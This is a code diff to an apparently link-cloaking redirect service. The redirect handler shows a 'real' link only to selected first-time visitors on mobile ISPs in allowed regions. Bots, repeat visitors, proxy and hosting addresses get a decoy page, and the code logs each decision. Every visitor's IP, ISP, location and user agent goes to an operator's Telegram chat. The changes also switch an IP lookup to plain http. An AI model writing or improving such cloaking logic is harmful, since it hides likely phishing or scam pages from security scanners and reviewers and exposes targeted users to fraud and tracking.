@@ -1762,17 +1762,20 @@ async function lookupIpGeo(ip) {
         }
 
         const response = await axios.get(
-            `https://ip-api.com/json/${encodeURIComponent(ip)}?fields=status,message,country,countryCode,regionName,city,isp,org,as,proxy,hosting,query,continentCode`,
+            `http://ip-api.com/json/${encodeURIComponent(ip)}?fields=status,message,country,countryCode,regionName,city,isp,org,as,proxy,hosting,query,continentCode`,
             { timeout: 5000 }
         );
         const data = response.data;
         if (data && data.status === 'success') {
             ipGeoCache.set(ip, { data, expiresAt: now + IP_GEO_CACHE_TTL_MS });
+            return data;
         } else {
+            console.warn(`[Proxy] IP lookup failed for ${ip} (ip-api): ${data.message || 'Unknown error'}`);
             // Cache negative result briefly
             ipGeoCache.set(ip, { data: null, expiresAt: now + 60 * 1000 });
         }
-    } catch {
+    } catch (err) {
+        console.error(`[Proxy] IP lookup error for ${ip}:`, err.message);
         // Cache negative result briefly
         ipGeoCache.set(ip, { data: null, expiresAt: now + 60 * 1000 });
     }
@@ -1870,25 +1873,15 @@ async function handleRedirection(user, req, res, linkData) {
         return res.status(403).send('Access denied. Your IP has been blocked by the operator.');
     }
 
-    if (isBot(req)) {
-        return res.redirect(nonRealLink || '/');
-    }
-
     // 1. Forced Redirect Check
     if (forcedIps.includes(clientIp)) {
         return res.redirect(realLink);
     }
 
-    // 2. Visited IP Check
-    const isVisited = (visitedIps || []).some(v => v.ip === clientIp);
-    if (isVisited && !useReallowVisited) {
-        return res.redirect(nonRealLink);
-    }
-
-    // 3. IP Analysis (cached)
+    // 2. IP Analysis (cached)
     const data = await lookupIpGeo(clientIp);
 
-    // 3a. Admin ISP block (matches against ISP/org names from geo response).
+    // 2a. Admin ISP block
     if (data && (adminBlocks.isps || []).length) {
         const candidates = [data.isp, data.org].filter(Boolean);
         if (candidates.some(c => ispMatchesAnyBlock(c, adminBlocks.isps))) {
@@ -1896,7 +1889,7 @@ async function handleRedirection(user, req, res, linkData) {
         }
     }
 
-    // 3b. Continent Filtering (Africa / Europe)
+    // 2b. Continent Filtering (Africa / Europe)
     if (data && data.status === 'success') {
         const continent = data.continentCode; // 'AF', 'EU', 'NA', 'AS', 'SA', 'OC', 'AN'
         if (!useAllowAfrica && continent === 'AF') {
@@ -1913,19 +1906,27 @@ async function handleRedirection(user, req, res, linkData) {
 
     // 4. Filtering Logic
     let targetUrl = realLink;
+    let redirectReason = null;
 
-    if (useAntiRed && isSuspicious) {
+    if (isBot(req)) {
         targetUrl = nonRealLink;
+        redirectReason = 'Bot Detection';
+    } else if (isVisited && !useReallowVisited) {
+        targetUrl = nonRealLink;
+        redirectReason = 'Repeated Visit';
+    } else if (useAntiRed && isSuspicious) {
+        targetUrl = nonRealLink;
+        redirectReason = `AntiRed (${isProxy ? 'Proxy' : ''}${isProxy && isHosting ? '+' : ''}${isHosting ? 'Hosting' : ''})`;
     } else if (useIspFilter && data && data.status === 'success') {
         const userISP = (data.isp || data.org || "").toUpperCase();
         const matches = (useMobileIsps || []).some(isp => isp && userISP.includes(isp.toUpperCase()));
         if (!matches) {
             targetUrl = nonRealLink;
+            redirectReason = 'ISP Filter';
         }
     }
 
-    // 5. Update Visited IPs — serially under the user's mutex so two
-    // concurrent visits can't trample. Drop oldest entries past the FIFO cap.
+    // 5. Update Visited IPs
     if (!isVisited) {
         const redirectType = targetUrl === realLink ? 'REAL' : 'SAFE';
         const newEntry = {
@@ -1946,7 +1947,7 @@ async function handleRedirection(user, req, res, linkData) {
         }).catch(err => console.error('[Proxy] visitedIps write failed', err.message));
     }
 
-    // 6. Telegram notification (HTML mode + escape). Fire-and-forget.
+    // 6. Telegram notification
     const botToken = settings.botToken || process.env.TELEGRAM_BOT_TOKEN;
     const chatId = settings.chatId || process.env.TELEGRAM_CHAT_ID;
 
@@ -1957,7 +1958,8 @@ async function handleRedirection(user, req, res, linkData) {
             `🏢 <b>ISP:</b> ${telegramEscape(data ? data.isp : 'Unknown')}\n` +
             `🌍 <b>Location:</b> ${telegramEscape(data ? `${data.city}, ${data.country}` : 'Unknown')}\n` +
             `💻 <b>UA:</b> ${telegramEscape(userAgent.slice(0, 240))}\n` +
-            `🎯 <b>Target:</b> <code>${targetUrl === realLink ? 'REAL' : 'SAFE'}</code>`;
+            `🎯 <b>Target:</b> <code>${targetUrl === realLink ? 'REAL' : 'SAFE'}</code>` +
+            (redirectReason ? `\n🛡️ <b>Reason:</b> <code>${telegramEscape(redirectReason)}</code>` : '');
 
         axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
             chat_id: chatId,
